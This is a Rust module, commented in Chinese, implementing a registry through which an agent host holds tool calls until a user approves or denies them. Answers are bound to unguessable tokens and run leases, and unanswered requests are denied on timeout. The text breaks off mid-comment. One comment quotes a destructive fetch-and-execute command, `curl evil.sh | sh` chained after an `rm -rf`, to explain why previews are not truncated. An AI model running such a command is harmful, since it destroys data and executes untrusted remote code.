//! 工具确认回路的宿主一半 —— 「agent 问、客户端答」里的那本待办簿。
//!
//! # 为什么在这里，而不在 `cortex-proto` 或 `cortex-agent`
//!
//! 它曾经在 `cortex-proto`，理由是「`GET /confirmations` 的响应体就是
//! `PendingInfo`」。但那句话只覆盖那个**线上类型**（它还留在那儿，与
//! `ChatEvent::Confirm` 做邻居），覆盖不了这本簿子 —— 簿子是运行时，
//! 而它把整个 `cortex-agent` 拖进了线协议 crate，挡着记忆那一层独立开源。
//!
//! 也没放进 `cortex-agent`：那是 agent 循环与工具的库，**不该知道 HTTP**。
//! 簿子要往 SSE 流上发事件、要认 HTTP 回执、要按 token 一次性消费 ——
//! 那是宿主的活。而宿主只剩一个：这个进程。cortexd 不跑 agent，
//! 容器里那个不问确认（越界路径直接拒绝）。
//!
//! ```text
//! agent 循环                  ConfirmRegistry              客户端
//!    │                              │                        │
//!    │ host.confirm(req) ──► open() │                        │
//!    │                              │ 登记 token             │
//!    │ ◄── token ───────────────────┤                        │
//!    │ SSE: ChatEvent::Confirm ─────┼───────────────────────►│
//!    │ (挂起 await) ────────────────┤                        │
//!    │                              │◄── POST /confirmations ┤
//!    │ ◄── Approval ────────────────┤   （token + 决定）      │
//!    │ 继续执行 / 回绝给模型         │  移除 token（一次性）   │
//! ```
//!
//! # 为什么不落库
//!
//! 待确认项是**活着的一轮对话的一部分**：进程一重启，那一轮的 agent 循环、
//! 它的模型上下文、它挂起的 future 全都没了，此时一条「还没答的确认」
//! 在数据库里就是一条永远等不到人的死记录。而在 append-only 体系里，
//! 一条写下去就删不掉的死记录比不写更糟。
//!
//! 审计需要的东西照样有：批准与否体现在 `episode_tool_calls` 的 `ok` 与
//! `summary` 上（被拒的调用留下 `ok=false` 与拒绝理由），那才是回放时
//! 真正要看的一行。
//!
//! # 谁能回答（多端）
//!
//! 答复走的是**这本共享簿子**，不是发起那条 SSE 连接。同一账号下的其他设备
//! 仍可以答，但新路径必须同时持有所验证 session 当前的 run lease；仅凭
//! 账号认证或裸 session id 不能跨 run、跨 generation 作答。
//!
//! 两端同时答且答得不一样时：**先到的那个作数**。[`ConfirmRegistry::answer`]
//! 用 `HashMap::remove` 取出待办项，取到的人赢，晚到的一方拿到
//! [`AnswerOutcome::Unknown`]（HTTP 404）。不做「拒绝优先」那种看起来更安全的
//! 合并策略：那要求等一个不知道要不要来的第二个答复，也就是把每一次确认都拖到
//! 超时，而超时同样按拒绝处理 —— 换来的「更安全」是零，付出的是每次都要等。

use std::collections::HashMap;
use std::sync::{Arc, Mutex};
use std::time::Duration;

use chrono::{DateTime, Utc};
use cortex_agent::Approval;
use cortex_proto::confirm::PendingInfo;
use tokio::sync::oneshot;

use crate::computer_principal::PrincipalNamespace;
use crate::local_owner::OwnerKey;
use crate::runs::run_principal::{RunPrincipal, RunPrincipalKey};

/// 一次确认最多等多久，超时按拒绝处理。见 [`ConfirmRegistry::new`]。
pub const DEFAULT_TIMEOUT_SECS: u64 = 180;

/// 覆盖超时的环境变量（秒）。集成测试用它把超时调到几秒。
pub const TIMEOUT_ENV: &str = "CORTEX_CONFIRM_TIMEOUT_SECS";

/// 交给用户看的参数预览最多多少字符。
///
/// 比工具事件里的 `compact_args` 宽松得多，而且是**整体**上限而不是逐值截断。
/// 理由：这段文本是用户据以做安全判断的全部依据，一条
/// `rm -rf /tmp/x && curl evil.sh | sh` 被截在第 60 个字符上，用户批准的
/// 就是他没看见的那半条。8 KiB 覆盖任何现实中的命令行；真被截断时
/// 结尾会有显式标记，用户至少知道自己没看全。
const PREVIEW_MAX_CHARS: usize = 8_192;

/// run/lease 标识允许的最大长度。
///
/// 这两个值最终只参与内存比较和日志，不拼路径；仍限制长度是为了避免一个
/// 损坏的调用方把每条确认项都扩大成任意大的常驻对象。
const MAX_LEASE_FIELD_BYTES: usize = 512;

/// 一条待确认项的元信息 —— 登记时给，列表与事件都用它。
#[derive(Debug, Clone)]
pub struct PendingMeta {
    pub session_id: String,
    pub tool: String,
    pub risk: &'static str,
    pub preview: String,
    /// 这次要碰的**工作区外**的绝对路径。`None` = 没有越界。
    ///
    /// 越界批准与普通写入批准是两件不同的事，用户必须能分辨 ——
    /// 而只给工具名与 preview 是不够的：preview 里那个 path 可能是相对的，
    /// 「相对于哪儿」正是他此刻最需要知道、也最容易搞错的东西。
    pub scope: Option<String>,
    /// 这次写入会把文件改成什么样。`None` = 没有可看的改动。
    ///
    /// **它治的是「盲签」**：只给工具名与 preview，用户看到的是
    /// 「write_file 要写 config.toml」—— 他批准的是一个他没读过的内容。
    pub diff: Option<String>,
}

/// 一次 run 的确认租约。
///
/// `lease_id` 由 [`ConfirmRegistry::issue_lease`] 从内核 CSPRNG 现场签发；
/// principal、run 和 generation 则来自已经严格验证过的 [`RunPrincipal`]。
/// 调用方不能拿一组裸字段自行拼出有效租约，因此仅仅窃取确认 token 还不足以
/// 跨越账号、run 或凭据代际。
///
/// 这里不把 lease 正文放进 `PendingMeta`：`PendingMeta` 是 SSE 与 HTTP 的
/// 展示数据，权限绑定若也塞在那里，调用方容易把用户可控字段误当成授权依据。
/// 权限字段独立放在 [`Pending`] 的内部 binding 中，展示数据与授权事实不能混用。
#[derive(Clone, Eq, PartialEq)]
pub(crate) struct ConfirmationLease {
    principal: RunPrincipalKey,
    run_id: String,
    generation: u64,
    principal_epoch: u64,
    lease_id: String,
}

impl ConfirmationLease {
    pub(crate) fn session_id(&self) -> &str {
        self.principal.session_id()
    }

    pub(crate) fn run_id(&self) -> &str {
        &self.run_id
    }

    #[cfg(test)]
    pub(crate) fn generation(&self) -> u64 {
        self.generation
    }

    fn is_current(&self, state: &RegistryState) -> bool {
        state.leases.get(&self.lease_id).is_some_and(|active| {
            active.principal == self.principal
                && active.run_id == self.run_id
                && active.generation == self.generation
                && active.principal_epoch == self.principal_epoch
        })
    }
}

impl std::fmt::Debug for ConfirmationLease {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("ConfirmationLease")
            .field("principal", &self.principal)
            .field("run_id", &self.run_id)
            .field("generation", &self.generation)
            .field("lease_id", &"<已设置>")
            .finish()
    }
}

#[derive(Debug)]
struct ActiveLease {
    principal: RunPrincipalKey,
    run_id: String,
    generation: u64,
    principal_epoch: u64,
}

enum PendingBinding {
    /// 新代码唯一应使用的路径：确认 token、主体、run、generation 和 lease
    /// 必须在同一把锁里一起匹配。
    Scoped(ConfirmationLease),
    /// 回归测试专用的 legacy 形状。生产构建里它根本不存在，避免“已认证
    /// 即可答复”的旧语义重新进入二进制。
    #[cfg(test)]
    Legacy,
}

impl PendingBinding {
    fn scoped(&self) -> Option<&ConfirmationLease> {
        match self {
            Self::Scoped(lease) => Some(lease),
            #[cfg(test)]
            Self::Legacy => None,
        }
    }
}

struct Pending {
    tx: oneshot::Sender<Approval>,
    meta: PendingMeta,
    binding: PendingBinding,
    asked_at: DateTime<Utc>,
    deadline: tokio::time::Instant,
}

/// 回执的处理结果。
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AnswerOutcome {
    /// 收下了，等待的那一轮已经拿到答复
    Accepted,
    /// 没有这个 token：伪造的、已经被别的设备答过的、超时作废的、
    /// 或者那一轮早就结束了。**四种情况故意不区分** —— 分开报会让
    /// 「猜一个 token 试试」变成一个可用的探测口，能问出「刚才有没有人
    /// 在批一条命令」
    Unknown,
}

/// 待确认项的簿子。整个进程一本，挂在 [`crate::turn::Engine`] 上。
pub struct ConfirmRegistry {
    inner: Mutex<RegistryState>,
    timeout: Duration,
}

struct RegistryState {
    pending: HashMap<String, Pending>,
    /// 随机 lease id 必须是这里现存的一项；克隆一个已经撤销的 lease 对象
    /// 不足以继续授权。
    leases: HashMap<String, ActiveLease>,
    /// 每个账号主体见过的最高凭据代际。代际属于 `(deployment, user)`，
    /// 不能按 session 分开记录：同一账号在一个 session 刷新凭据后，另一个
    /// session 上的旧代际租约也必须立即失效。
    generations: HashMap<OwnerKey, u64>,
}

impl RegistryState {
    fn new() -> Self {
        Self {
            pending: HashMap::new(),
            leases: HashMap::new(),
            generations: HashMap::new(),
        }
    }

    /// 推进主体代际并撤销旧代际。
    ///
    /// 返回 `false` 表示调用方拿来了一个已经被新代际淘汰的旧值。generation
    /// 不能回退，否则一次迟到的旧请求可以把已经失效的确认重新“激活”。
    fn advance_generation(&mut self, principal: &OwnerKey, generation: u64) -> bool {
        match self.generations.get(principal).copied() {
            Some(current) if generation < current => false,
            Some(current) if generation == current => true,
            _ => {
                let revoked_leases: Vec<String> = self
                    .leases
                    .iter()
                    .filter(|(_, lease)| {
                        lease.principal.belongs_to_owner(principal) && lease.generation < generation
                    })
                    .map(|(lease_id, _)| lease_id.clone())
                    .collect();
                for lease_id in revoked_leases {
                    self.leases.remove(&lease_id);
                }
                self.pending.retain(|_, pending| {
                    !matches!(
                        &pending.binding,
                        PendingBinding::Scoped(lease)
                            if lease.principal.belongs_to_owner(principal)
                                && lease.generation < generation
                    )
                });
                self.generations.insert(principal.clone(), generation);
                true
            }
        }
    }
}

impl ConfirmRegistry {
    /// 超时取自 [`TIMEOUT_ENV`]，缺省 [`DEFAULT_TIMEOUT_SECS`]。
    ///
    /// # 超时后是放行还是拒绝 —— 拒绝
    ///
    /// 没人回答意味着**没人看见**：页面关了、网断了、客户端崩了。
    /// 两个方向的错误代价完全不对称：
    ///
    /// - 超时放行 → 关掉笔记本盖子就等于把 shell 交出去，而且不会有任何
    ///   痕迹告诉用户「你不在的时候批准了一条命令」。这是**不可挽回**的：
    ///   命令已经跑完了。
    /// - 超时拒绝 → 模型收到一句「没人回答」，换条只读的路或者收口告诉用户
    ///   卡在哪。用户回来重发一句就是了。这是**可挽回**的。
    ///
    /// 取值取不出数时报错而不是悄悄用默认值：把超时配成 `abc` 却照跑，
    /// 等于安全边界失效而运维完全不知情（与 `CORTEX_AGENT_MAX_ROUNDS`
    /// 的处理一致）。
    pub fn from_env() -> cortex_core::Result<Self> {
        let secs = match std::env::var(TIMEOUT_ENV) {
            Ok(v) => v.trim().parse::<u64>().map_err(|_| {
                cortex_core::CortexError::Config(format!(
                    "{TIMEOUT_ENV} 必须是正整数秒，实际是 {v:?}"
                ))
            })?,
            Err(_) => DEFAULT_TIMEOUT_SECS,
        };
        if secs == 0 {
            return Err(cortex_core::CortexError::Config(format!(
                "{TIMEOUT_ENV} 不能是 0 —— 那等于「高风险工具一律拒绝」，\
                 想要那个效果请不要接确认通道，而不是把超时配成 0"
            )));
        }
        Ok(Self::new(Duration::from_secs(secs)))
    }

    #[must_use]
    pub fn new(timeout: Duration) -> Self {
        Self {
            inner: Mutex::new(RegistryState::new()),
            timeout,
        }
    }

    #[must_use]
    pub fn timeout(&self) -> Duration {
        self.timeout
    }

    /// 为一个已经严格验证的 run 签发确认租约。
    ///
    /// 只有本机、且有已验证 `(deployment, user)` 的 principal 能拿到租约。
    /// 云端容器没有宿主账号，确认工具也不会在那边提出请求，所以这里直接
    /// 拒绝，避免一套容器内 ID 被误拿来打开本机确认通道。
    pub(crate) fn issue_lease(
        &self,
        principal: &RunPrincipal,
        run_id: impl Into<String>,
    ) -> cortex_core::Result<ConfirmationLease> {
        let run_id = validate_lease_field("run_id", run_id.into())?;
        let generation = principal.credential().generation();
        let principal_epoch = principal.credential().principal_epoch();
        let namespace = principal.key().owner()?;
        let principal = principal.key().clone();
        let mut state = self.inner.lock().expect("确认簿的锁不该中毒");
        if !state.advance_generation(&namespace, generation) {
            return Err(cortex_core::CortexError::Unauthorized(
                "确认租约的凭据代际已经过期".into(),
            ));
        }
        let lease_id = loop {
            let candidate = mint_token();
            if !state.leases.contains_key(&candidate) {
                break candidate;
            }
        };
        state.leases.insert(
            lease_id.clone(),
            ActiveLease {
                principal: principal.clone(),
                run_id: run_id.clone(),
                generation,
                principal_epoch,
            },
        );
        Ok(ConfirmationLease {
            principal,
            run_id,
            generation,
            principal_epoch,
            lease_id,
        })
    }

    /// 登记一条受 run lease 约束的待确认项。
    pub(crate) fn open_scoped(
        self: &Arc<Self>,
        meta: PendingMeta,
        lease: &ConfirmationLease,
    ) -> cortex_core::Result<PendingConfirm> {
        if meta.session_id != lease.session_id() {
            return Err(cortex_core::CortexError::Unauthorized(
                "确认项的 session 与 run lease 不一致".into(),
            ));
        }
        let mut guard = self.inner.lock().expect("确认簿的锁不该中毒");
        if !lease.is_current(&guard) {
            return Err(cortex_core::CortexError::Unauthorized(
                "确认租约已经撤销或与当前主体不一致".into(),
            ));
        }
        let token = loop {
            let candidate = mint_token();
            if !guard.pending.contains_key(&candidate) {
                break candidate;
            }
        };
        let (tx, rx) = oneshot::channel();
        let deadline = tokio::time::Instant::now() + self.timeout;
        guard.pending.insert(
            token.clone(),
            Pending {
                tx,
                meta,
                binding: PendingBinding::Scoped(lease.clone()),
                asked_at: Utc::now(),
                deadline,
            },
        );
        drop(guard);
        Ok(PendingConfirm {
            token,
            rx: Some(rx),
            deadline,
            registry: Arc::clone(self),
        })
    }

    /// 登记一条旧式待确认项。
    ///
    /// **只存在于测试构建。** 该路径没有 principal/run/lease 参数，仅用于
    /// 回归旧 token 行为；生产代码只能使用 [`Self::open_scoped`]。
    ///
    /// **先登记再发事件**，顺序不能反：反过来的话，一个手快的客户端
    /// （或者本机 loopback 上几乎零延迟的 CLI）可能在登记完成之前就把回执
    /// 打回来，那条回执会撞上一个还不存在的 token 被判为伪造，
    /// 而那一轮则继续傻等到超时。这个竞态在慢网络上永远复现不出来。
    #[cfg(test)]
    pub fn open(self: &Arc<Self>, meta: PendingMeta) -> PendingConfirm {
        self.open_inner(meta, PendingBinding::Legacy)
    }

    #[cfg(test)]
    fn open_inner(self: &Arc<Self>, meta: PendingMeta, binding: PendingBinding) -> PendingConfirm {
        let token = mint_token();
        let (tx, rx) = oneshot::channel();
        let mut guard = self.inner.lock().expect("确认簿的锁不该中毒");
        // 截止时间从登记这一刻算，而不是从后来开始等待的那一刻算。
        // 先拿锁再读时钟，避免排队登记的时间吞掉用户的确认窗口。
        let deadline = tokio::time::Instant::now() + self.timeout;
        let pending = Pending {
            tx,
            meta,
            binding,
            asked_at: Utc::now(),
            deadline,
        };
        guard.pending.insert(token.clone(), pending);
        drop(guard);
        PendingConfirm {
            token,
            rx: Some(rx),
            deadline,
            registry: Arc::clone(self),
        }
    }

    /// 按 principal、generation、run 与 lease 处理一条回执。
    ///
    /// 所有比较、过期判断、`remove` 和向等待方投递都在同一把锁内完成。
    /// 不匹配时不会先消费 token，因此另一个主体拿窃取到的 token 探测不会
    /// 把原待办项弄丢。
    #[cfg(test)]
    pub(crate) fn answer_scoped(
        &self,
        lease: &ConfirmationLease,
        token: &str,
        approval: Approval,
    ) -> AnswerOutcome {
        let mut guard = self.inner.lock().expect("确认簿的锁不该中毒");
        if !lease.is_current(&guard) {
            return AnswerOutcome::Unknown;
        }
        let matches = guard.pending.get(token).is_some_and(|pending| {
            matches!(
                &pending.binding,
                PendingBinding::Scoped(bound) if bound == lease
            )
        });
        if !matches {
            return AnswerOutcome::Unknown;
        }
        if tokio::time::Instant::now() >= guard.pending[token].deadline {
            guard.pending.remove(token);
            return AnswerOutcome::Unknown;
        }
        let Some(pending) = guard.pending.remove(token) else {
            return AnswerOutcome::Unknown;
        };
        let sent = pending.tx.send(approval).is_ok();
        drop(guard);
        if !sent {
            return AnswerOutcome::Unknown;
        }
        tracing::info!(
            tool = %pending.meta.tool,
            session = %pending.meta.session_id,
            run_id = %lease.run_id,
            generation = lease.generation,
            ?approval,
            "收到工具确认回执"
        );
        AnswerOutcome::Accepted
    }

    #[cfg(test)]
    pub(crate) fn approve_scoped(&self, lease: &ConfirmationLease, token: &str) -> AnswerOutcome {
        self.answer_scoped(lease, token, Approval::Allow)
    }

    #[cfg(test)]
    pub(crate) fn deny_scoped(&self, lease: &ConfirmationLease, token: &str) -> AnswerOutcome {
        self.answer_scoped(lease, token, Approval::Denied)
    }

    /// 处理一条旧式回执。**仅供本模块测试构造 legacy 待办项。**
    #[cfg(test)]
    pub fn answer(&self, token: &str, approval: Approval) -> AnswerOutcome {
        // remove 而非 get：**一次性**。取到的人赢，这既实现了「先到作数」，
        // 也让同一个 token 无法被重放去批准第二次调用
        let mut guard = self.inner.lock().expect("确认簿的锁不该中毒");
        let legacy = guard
            .pending
            .get(token)
            .is_some_and(|pending| matches!(&pending.binding, PendingBinding::Legacy));
        if !legacy {
            return AnswerOutcome::Unknown;
        }
        let Some(pending) = guard.pending.remove(token) else {
            return AnswerOutcome::Unknown;
        };
        // 一定要在拿到锁之后看时钟：等锁期间跨过截止时间也算迟到。
        // 等待方可能还没开始 wait，或者已经到期但尚未被调度，不能依赖它清理。
        if tokio::time::Instant::now() >= pending.deadline {
            return AnswerOutcome::Unknown;
        }
        // 接收端已经走了（那一轮超时了或者断了）。对回执方来说这与
        // 「没有这个 token」是同一件事：他的答复没有起作用
        // 检查、移除与投递都在锁内：超时方拿锁后才能判断答复是否已被收下。
        let sent = pending.tx.send(approval).is_ok();
        drop(guard);
        if !sent {
            return AnswerOutcome::Unknown;
        }
        tracing::info!(
            tool = %pending.meta.tool,
            session = %pending.meta.session_id,
            ?approval,
            "收到工具确认回执"
        );
        AnswerOutcome::Accepted
    }

    /// 当前 run lease 下还在等的确认项。
    ///
    /// principal、run、generation 与 lease 全部参与过滤；调用方传入另一个
    /// 会话的裸 session id 也拿不到任何结果。
    #[cfg(test)]
    pub(crate) fn pending_scoped(
        &self,
        lease: &ConfirmationLease,
        session_id: Option<&str>,
    ) -> Vec<PendingInfo> {
        let guard = self.inner.lock().expect("确认簿的锁不该中毒");
        if !lease.is_current(&guard) {
            return Vec::new();
        }
        if session_id.is_some_and(|session| session != lease.session_id()) {
            return Vec::new();
        }
        let now = tokio::time::Instant::now();
        let mut out: Vec<PendingInfo> = guard
            .pending
            .iter()
            .filter(|(_, pending)| {
                now < pending.deadline
                    && matches!(
                        &pending.binding,
                        PendingBinding::Scoped(bound) if bound == lease
                    )
            })
            .map(|(token, pending)| PendingInfo {
                token: token.clone(),
                session_id: pending.meta.session_id.clone(),
                tool: pending.meta.tool.clone(),
                risk: pending.meta.risk.to_string(),
                preview: pending.meta.preview.clone(),
                asked_at: pending.asked_at.to_rfc3339(),
                expires_in_secs: pending.deadline.saturating_duration_since(now).as_secs(),
                scope: pending.meta.scope.clone(),
                diff: pending.meta.diff.clone(),
            })
            .collect();
        out.sort_by(|a, b| a.asked_at.cmp(&b.asked_at));
        out
    }

    /// 当前已严格验证账号下仍在等待的确认项。
    ///
    /// 断线重连与 CLI 都可能只知道账号、不知道当前 run。这里仍然不能退回
    /// 裸 session：每条待确认项必须属于一个仍然有效的 scoped lease，且该
    /// lease 的主体与调用方刚验证出的 `(deployment, user)` 完全一致。
    #[cfg(test)]
    pub(crate) fn pending_for_principal(
        &self,
        principal: &PrincipalNamespace,
        session_id: Option<&str>,
    ) -> Vec<PendingInfo> {
        let guard = self.inner.lock().expect("确认簿的锁不该中毒");
        let now = tokio::time::Instant::now();
        let mut out: Vec<PendingInfo> = guard
            .pending
            .iter()
            .filter(|(_, pending)| {
                if now >= pending.deadline
                    || session_id.is_some_and(|session| pending.meta.session_id != session)
                {
                    return false;
                }
                let Some(lease) = pending.binding.scoped() else {
                    return false;
                };
                lease.is_current(&guard)
                    && lease
                        .principal
                        .verified_namespace()
                        .is_some_and(|candidate| candidate == principal)
            })
            .map(|(token, pending)| PendingInfo {
                token: token.clone(),
                session_id: pending.meta.session_id.clone(),
                tool: pending.meta.tool.clone(),
                risk: pending.meta.risk.to_string(),
                preview: pending.meta.preview.clone(),
                asked_at: pending.asked_at.to_rfc3339(),
                expires_in_secs: pending.deadline.saturating_duration_since(now).as_secs(),
                scope: pending.meta.scope.clone(),
                diff: pending.meta.diff.clone(),
            })
            .collect();
        out.sort_by(|a, b| a.asked_at.cmp(&b.asked_at));
        out
    }

    /// 用一次性 token 在刚验证出的账号内投递回执。
    ///
    /// token 本身就是不可猜测的待办标识，不需要客户端再声明 run id。账号
    /// 主体仍必须与待办内置 lease 一致；A 的 token 到了 B 手里，既不能列出
    /// A 的待办，也不能批准或拒绝它。
    pub(crate) fn pending_for_owner(
        &self,
        owner: &OwnerKey,
        epoch: u64,
        session: Option<&str>,
    ) -> Vec<PendingInfo> {
        let guard = self.inner.lock().expect("确认簿锁可用");
        let now = tokio::time::Instant::now();
        guard
            .pending
            .iter()
            .filter_map(|(token, pending)| {
                let lease = pending.binding.scoped()?;
                if !lease.principal.belongs_to_owner(owner)
                    || lease.principal_epoch != epoch
                    || !lease.is_current(&guard)
                    || now >= pending.deadline
                    || session.is_some_and(|s| s != pending.meta.session_id)
                {
                    return None;
                }
                Some(PendingInfo {
                    token: token.clone(),
                    session_id: pending.meta.session_id.clone(),
                    tool: pending.meta.tool.clone(),
                    risk: pending.meta.risk.into(),
                    preview: pending.meta.preview.clone(),
                    asked_at: pending.asked_at.to_rfc3339(),
                    expires_in_secs: pending.deadline.saturating_duration_since(now).as_secs(),
                    scope: pending.meta.scope.clone(),
                    diff: pending.meta.diff.clone(),
                })
            })
            .collect()
    }

    pub(crate) fn answer_for_owner(
        &self,
        owner: &OwnerKey,
        epoch: u64,
        session: Option<&str>,
        token: &str,
        approval: Approval,
    ) -> AnswerOutcome {
        let mut guard = self.inner.lock().expect("确认簿锁可用");
        let Some(pending) = guard.pending.get(token) else {
            return AnswerOutcome::Unknown;
        };
        let Some(lease) = pending.binding.scoped() else {
            return AnswerOutcome::Unknown;
        };
        if !lease.principal.belongs_to_owner(owner)
            || lease.principal_epoch != epoch
            || !lease.is_current(&guard)
            || session.is_some_and(|s| s != pending.meta.session_id)
        {
            return AnswerOutcome::Unknown;
        }
        if tokio::time::Instant::now() >= pending.deadline {
            guard.pending.remove(token);
            return AnswerOutcome::Unknown;
        }
        let pending = guard.pending.remove(token).expect("同锁内待办仍存在");
        if pending.tx.send(approval).is_ok() {
            AnswerOutcome::Accepted
        } else {
            AnswerOutcome::Unknown
        }
    }

    /// 撤销某个账号主体在所有 session 中的未决确认和确认租约。
    ///
    /// 账号切换、登出以及确认通道被管理员关闭时都应调用。被撤销等待方会
    /// 立即收到 `Unanswered`，旧 lease 的后续 list/approve/deny 全部失败关闭。
    pub(crate) fn revoke_principal(&self, principal: &PrincipalNamespace) -> usize {
        let mut state = self.inner.lock().expect("确认簿的锁不该中毒");
        let revoked_leases: Vec<String> = state
            .leases
            .iter()
            .filter(|(_, lease)| {
                lease
                    .principal
                    .verified_namespace()
                    .is_some_and(|candidate| candidate == principal)
            })
            .map(|(lease_id, _)| lease_id.clone())
            .collect();
        for lease_id in revoked_leases {
            state.leases.remove(&lease_id);
        }
        let before = state.pending.len();
        state.pending.retain(|_, pending| {
            !matches!(
                &pending.binding,
                PendingBinding::Scoped(lease)
                    if lease
                        .principal
                        .verified_namespace()
                        .is_some_and(|candidate| candidate == principal)
            )
        });
        before - state.pending.len()
    }

    /// 撤销一个 run 的租约和全部未决确认。
    #[cfg(test)]
    pub(crate) fn revoke_run(&self, principal: &RunPrincipalKey, run_id: &str) -> usize {
        let mut state = self.inner.lock().expect("确认簿的锁不该中毒");
        let revoked_leases: Vec<String> = state
            .leases
            .iter()
            .filter(|(_, lease)| &lease.principal == principal && lease.run_id == run_id)
            .map(|(lease_id, _)| lease_id.clone())
            .collect();
        for lease_id in revoked_leases {
            state.leases.remove(&lease_id);
        }
        let before = state.pending.len();
        state.pending.retain(|_, pending| {
            !matches!(
                &pending.binding,
                PendingBinding::Scoped(lease)
                    if &lease.principal == principal && lease.run_id == run_id
            )
        });
        before - state.pending.len()
    }

    /// 撤销一条租约及其全部未决确认。
    pub(crate) fn revoke_lease(&self, lease: &ConfirmationLease) -> usize {
        let mut state = self.inner.lock().expect("确认簿的锁不该中毒");
        state.leases.remove(&lease.lease_id);
        let before = state.pending.len();
        state.pending.retain(|_, pending| {
            !matches!(
                &pending.binding,
                PendingBinding::Scoped(bound) if bound.lease_id == lease.lease_id
            )
        });
        before - state.pending.len()
    }

    /// 当前还在等的确认项。**仅供本模块测试构造 legacy 待办项。**
    ///
    /// 这是**断线重连的答案**：SSE 一断，那条流上的确认请求事件就再也不会
    /// 重发（POST /chat 的流是一次性的，没有 Last-Event-ID 重放）。重连后的
    /// 客户端拉一次这个端点就知道「有没有什么还等着我批」。同一个端点也是
    /// 第二台设备发现待办项的唯一途径 —— 确认请求刻意**不**走 `/ws` 广播：
    /// 那条通道的契约是「只推信号不推数据」（见 [`crate::dto::SyncEvent`]），
    /// 为一个活不过进程重启的东西破例，会把那条契约上的三条理由全部作废。
    #[cfg(test)]
    pub fn pending(&self, session_id: Option<&str>) -> Vec<PendingInfo> {
        let guard = self.inner.lock().expect("确认簿的锁不该中毒");
        // 与答复一样，等锁期间也可能到期；列表不能再给客户端一个失效凭据。
        let now = tokio::time::Instant::now();
        let mut out: Vec<PendingInfo> = guard
            .pending
            .iter()
            .filter(|(_, p)| {
                matches!(&p.binding, PendingBinding::Legacy)
                    && now < p.deadline
                    && session_id.is_none_or(|s| p.meta.session_id == s)
            })
            .map(|(token, p)| PendingInfo {
                token: token.clone(),
                session_id: p.meta.session_id.clone(),
                tool: p.meta.tool.clone(),
                risk: p.meta.risk.to_string(),
                preview: p.meta.preview.clone(),
                asked_at: p.asked_at.to_rfc3339(),
                expires_in_secs: p.deadline.saturating_duration_since(now).as_secs(),
                scope: p.meta.scope.clone(),
                diff: p.meta.diff.clone(),
            })
            .collect();
        // 稳定顺序：先问的排前面。HashMap 的迭代序每次都不一样，
        // 客户端列表会随机重排
        out.sort_by(|a, b| a.asked_at.cmp(&b.asked_at));
        out
    }

    fn forget(&self, token: &str) {
        self.inner
            .lock()
            .expect("确认簿的锁不该中毒")
            .pending
            .remove(token);
    }

    #[cfg(test)]
    fn len(&self) -> usize {
        self.inner.lock().expect("确认簿的锁不该中毒").pending.len()
    }
}

fn validate_lease_field(name: &str, value: String) -> cortex_core::Result<String> {
    if value.is_empty() || value.trim() != value {
        return Err(cortex_core::CortexError::Invalid(format!(
            "{name} 不能为空或带首尾空白"
        )));
    }
    if value.len() > MAX_LEASE_FIELD_BYTES {
        return Err(cortex_core::CortexError::Invalid(format!(
            "{name} 超过 {MAX_LEASE_FIELD_BYTES} 字节上限"
        )));
    }
    if value.chars().any(char::is_control) {
        return Err(cortex_core::CortexError::Invalid(format!(
            "{name} 不能包含控制字符"
        )));
    }
    Ok(value)
}

/// 一条已登记、等着被回答的确认项。
///
/// `Drop` 时把自己从簿子上划掉：无论等待方是超时了、被取消了还是 panic 了，
/// 待办项都不会留在簿子上变成一条永远列得出来却没人在等的幽灵记录。
pub struct PendingConfirm {
    token: String,
    rx: Option<oneshot::Receiver<Approval>>,
    deadline: tokio::time::Instant,
    registry: Arc<ConfirmRegistry>,
}

impl PendingConfirm {
    /// 事件投递与回执等待共享登记时的截止时间；投递受阻不能延长授权窗口。
    ///
    /// 待确认项在投递前已经登记，客户端可能通过重连列表答复；因此即便事件
    /// 暂时发不出去，也必须并行接收有效回执，而不是直接视为拒绝。
    pub(crate) async fn wait_with_delivery<F>(self, delivery: F) -> Approval
    where
        F: std::future::Future<Output = ()> + Send,
    {
        let wait = self.wait(std::future::pending());
        tokio::pin!(wait);
        tokio::pin!(delivery);
        tokio::select! {
            biased;
            approval = &mut wait => approval,
            () = &mut delivery => wait.await,
        }
    }

    #[must_use]
    pub fn token(&self) -> &str {
        &self.token
    }

    /// 等一个答复。三条路先到先算：回执、客户端断开、超时。
    ///
    /// `cancelled` 是「发起这一轮的客户端已经走了」的信号。它不是可有可无的
    /// 优化：确认期间 agent 循环不发任何事件，因此**已有的那套「send 失败即
    /// 客户端断开」的探测在这段时间里完全失灵**，没有它，关掉页面之后那一轮
    /// 会原地挂满整个超时，期间占着一个数据库连接和一份模型上下文。
    pub async fn wait<C>(mut self, cancelled: C) -> Approval
    where
        C: std::future::Future<Output = ()> + Send,
    {
        let mut rx = self.rx.take().expect("wait 只会被调用一次");
        let timed_out = tokio::select! {
            // 已在截止前收下的回执不能因等待方调度得晚而丢失。
            biased;
            answer = &mut rx => return answer.unwrap_or(Approval::Unanswered),
            () = cancelled => false,
            () = tokio::time::sleep_until(self.deadline) => true,
        };

        // select 可能先看到 rx 未就绪，再看到超时；中间另一线程恰好收下回执。
        // 与 answer 争同一把锁：我们先移除则回执拿 Unknown；答复先投递则读到
        // 它，不能先给对方 Accepted、自己却返回 Unanswered。取消分支同理。
        self.registry.forget(&self.token);
        match rx.await {
            Ok(answer) => answer,
            Err(_) => {
                if timed_out {
                    tracing::warn!(
                        secs = self.registry.timeout.as_secs(),
                        "工具确认超时，按拒绝处理"
                    );
                } else {
                    tracing::info!("确认期间客户端断开，按未应答处理");
                }
                Approval::Unanswered
            }
        }
    }
}

impl Drop for PendingConfirm {
    fn drop(&mut self) {
        self.registry.forget(&self.token);
    }
}

/// 铸一个回执凭据。
///
/// # 为什么不能用工具调用的 id
///
/// 模型给的 `tool_call_id` 是可预测的（`call_0`、`call_1`、`toolu_…`），
/// 而且**它出自模型**，也就是出自那个被权限闸门防着的一侧。用它当凭据等于
/// 让任何猜得到形状的人替用户批准一次 shell 执行。
///
/// # 256 位，直接来自内核 CSPRNG
///
/// 不用 ULID：它的高 48 位是毫秒时间戳，是可预测的，随机位只有 80。
/// 猜中一个活着的 token 需要的不只是熵，还得赶在它作废之前 —— 但把安全性
/// 建立在「窗口很短」上是把两个独立的保护合成了一个。`getrandom` 直接走
/// `getrandom(2)` / `BCryptGenRandom`，没有用户态 RNG 状态可议。
///
/// 凭据本身仍然只是**第二道**闸：回执端点在认证之后（见 [`crate::auth`]），
/// 未认证的请求根本到不了这里。两道都要有 —— 认证挡的是「你是谁」，
